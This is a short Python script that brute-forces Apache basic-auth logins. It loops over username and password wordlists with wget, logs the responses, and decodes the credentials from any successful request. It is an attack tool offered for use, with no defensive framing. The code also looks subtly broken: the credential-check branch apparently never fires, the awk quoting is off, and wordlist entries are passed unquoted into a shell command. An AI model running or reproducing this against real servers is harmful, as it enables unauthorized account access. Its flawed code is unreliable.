#!/usr/bin/python3
# Python script for brute forcing apache2 basic auth on linux machines
 
import base64
import subprocess

target = "127.0.0.1"

with open('usernames', 'r') as user_file:
    usernames = user_file.read().splitlines()

with open('passwords.txt', 'r') as pass_file:
    passwords = pass_file.read().splitlines()


for username in usernames:
    for password in passwords:
        command = f'wget -d {target} --http-user={username}  --http-password={password} 2>&1'
        output = subprocess.getoutput(command)

        with open('wget_log', 'a') as log_file:
            log_file.write(output)


if subprocess.check_output('test -s wget_log', shell=True):
    print("Searching logs for credentials")
    output = subprocess.getoutput('cat wget_log | grep -B 5 "HTTP/1.1 200 OK" | head -1 | awk {"print $3"}')
    decoded_output = base64.b64decode(output).decode()
    print(decoded_output)
    print("")